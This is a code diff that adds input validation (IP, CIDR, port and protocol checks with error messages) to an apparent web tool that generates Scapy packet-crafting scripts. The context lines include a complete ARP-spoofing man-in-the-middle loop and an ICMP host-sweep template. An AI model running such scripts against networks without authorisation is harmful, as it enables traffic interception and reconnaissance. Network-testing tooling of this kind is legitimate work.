@@ -61,6 +61,8 @@
     }
     .field input:focus,.field select:focus{border-color:var(--accent);}
     .field input::placeholder{color:var(--text-faint);}
+    .field input.input-error{border-color:#ef4444!important;box-shadow:0 0 0 2px #ef444422!important;}
+    .inp-err{font-size:0.65rem;color:#f87171;margin-top:2px;display:none;}
 
     .flag-row{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:20px;}
     .flag-btn{
@@ -271,13 +273,39 @@
       .replace(/\b(\d+)\b/g, '<span class="num">$1</span>');
   }
 
+  function isValidIp(v) {
+    const p = v.split('.'); return p.length===4 && p.every(x=>/^\d+$/.test(x)&&+x<=255);
+  }
+  function isValidIpOrCidr(v) {
+    const c = v.split('/'); return isValidIp(c[0]) && (c[1]===undefined||(+c[1]>=0&&+c[1]<=32));
+  }
+  function isValidPort(v) {
+    const n=parseInt(v,10); return /^\d+$/.test(v)&&n>=1&&n<=65535;
+  }
+  function setSErr(id, msg) {
+    const el = document.getElementById(id); if(!el) return;
+    el.classList.toggle('input-error',!!msg);
+    let er = el.parentElement.querySelector('.inp-err');
+    if(!er){er=document.createElement('div');er.className='inp-err';el.after(er);}
+    er.textContent=msg||''; er.style.display=msg?'':'none';
+  }
+
   function build() {
     let code = '';
     const m = currentMode;
 
+    // Clear previous errors
+    ['tcp_syn_dst','tcp_syn_dport','tcp_syn_sport','tcp_syn_count','icmp_dst',
+     'dns_server','arp_victim','arp_gateway','raw_proto'].forEach(id=>setSErr(id,''));
+
     if (m === 'tcp_syn') {
-      const dst    = g('tcp_syn_dst')    || '192.168.1.1';
-      const dport  = g('tcp_syn_dport')  || '80';
+      const dstRaw  = g('tcp_syn_dst'); const dportRaw = g('tcp_syn_dport');
+      const sportRaw= g('tcp_syn_sport');
+      if (dstRaw  && !isValidIp(dstRaw))   setSErr('tcp_syn_dst',   'Invalid IP address');
+      if (dportRaw && !isValidPort(dportRaw)) setSErr('tcp_syn_dport','Port must be 1–65535');
+      if (sportRaw && sportRaw!=='0' && !isValidPort(sportRaw)) setSErr('tcp_syn_sport','Port must be 1–65535 or 0');
+      const dst    = dstRaw    || '192.168.1.1';
+      const dport  = dportRaw  || '80';
       const sport  = g('tcp_syn_sport');
       const count  = parseInt(g('tcp_syn_count')) || 1;
       const inter  = parseFloat(g('tcp_syn_inter')) || 0;
@@ -313,7 +341,9 @@
       code = `from scapy.all import *\n\npkt = ${ipLayer} / UDP(dport=${dport})${payloadStr}\nsend(pkt, count=${count})`;
 
     } else if (m === 'icmp') {
-      const dst    = g('icmp_dst')   || '192.168.1.1';
+      const dstRaw = g('icmp_dst');
+      if (dstRaw && !isValidIpOrCidr(dstRaw)) setSErr('icmp_dst','Invalid IP/CIDR');
+      const dst    = dstRaw || '192.168.1.1';
       const type   = g('icmp_type')  || '8';
       const size   = parseInt(g('icmp_size'))  || 64;
       const count  = parseInt(g('icmp_count')) || 3;
@@ -321,20 +351,28 @@
       code = `from scapy.all import *\n\ntargets = Net("${dst}")\n\nfor t in targets:\n    pkt = IP(dst=t) / ICMP(type=${type}) / (b"A" * ${pad})\n    ans, _ = sr(pkt, timeout=1, count=${count})\n    for s, r in ans:\n        print(f"[+] {r[IP].src} is up (RTT: {r.time - s.sent_time:.2f}s)")`;
 
     } else if (m === 'dns') {
-      const server = g('dns_server') || '8.8.8.8';
+      const serverRaw = g('dns_server');
+      if (serverRaw && !isValidIp(serverRaw)) setSErr('dns_server','Invalid IP address');
+      const server = serverRaw || '8.8.8.8';
       const qname  = g('dns_qname')  || 'example.com';
       const qtype  = g('dns_qtype')  || 'A';
       code = `from scapy.all import *\n\npkt = IP(dst="${server}") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="${qname}.", qtype="${qtype}"))\nresp = sr1(pkt, verbose=0, timeout=3)\n\nif resp and resp.haslayer(DNS):\n    for i in range(resp[DNS].ancount):\n        print(resp[DNS].an[i].rdata)`;
 
     } else if (m === 'arp_spoof') {
-      const victim   = g('arp_victim')   || '192.168.1.10';
-      const gateway  = g('arp_gateway')  || '192.168.1.1';
+      const victimRaw  = g('arp_victim'); const gatewayRaw = g('arp_gateway');
+      if (victimRaw  && !isValidIp(victimRaw))  setSErr('arp_victim',  'Invalid IP address');
+      if (gatewayRaw && !isValidIp(gatewayRaw)) setSErr('arp_gateway', 'Invalid IP address');
+      const victim   = victimRaw  || '192.168.1.10';
+      const gateway  = gatewayRaw || '192.168.1.1';
       const interval = parseFloat(g('arp_interval')) || 2;
       code = `from scapy.all import *\nimport time\n\ndef get_mac(ip):\n    arp = ARP(pdst=ip)\n    ether = Ether(dst="ff:ff:ff:ff:ff:ff")\n    ans, _ = srp(ether / arp, timeout=3, verbose=0)\n    return ans[0][1].hwsrc\n\nvictim_ip  = "${victim}"\ngateway_ip = "${gateway}"\nvictim_mac  = get_mac(victim_ip)\ngateway_mac = get_mac(gateway_ip)\n\nprint(f"[*] Poisoning {victim_ip} (MAC: {victim_mac})")\nprint(f"[*] Spoofing  {gateway_ip} (MAC: {gateway_mac})")\n\ntry:\n    while True:\n        # Tell victim: we are the gateway\n        send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip), verbose=0)\n        # Tell gateway: we are the victim\n        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip), verbose=0)\n        time.sleep(${interval})\nexcept KeyboardInterrupt:\n    print("\\n[!] Restoring ARP tables...")\n    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=0)\n    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=0)`;
 
     } else if (m === 'raw') {
-      const dst     = g('raw_dst')     || '192.168.1.1';
-      const proto   = g('raw_proto')   || '253';
+      const dstRaw   = g('raw_dst');   const protoRaw = g('raw_proto');
+      if (dstRaw  && !isValidIp(dstRaw))  setSErr('raw_dst','Invalid IP address');
+      if (protoRaw && (!/^\d+$/.test(protoRaw)||+protoRaw>255)) setSErr('raw_proto','Protocol must be 0–255');
+      const dst     = dstRaw    || '192.168.1.1';
+      const proto   = protoRaw  || '253';
       const payload = g('raw_payload') || '\\x41\\x41\\x41\\x41';
       const count   = parseInt(g('raw_count')) || 1;
       code = `from scapy.all import *\n\npkt = IP(dst="${dst}", proto=${proto}) / Raw(load="${payload}")\nsend(pkt, count=${count})`;
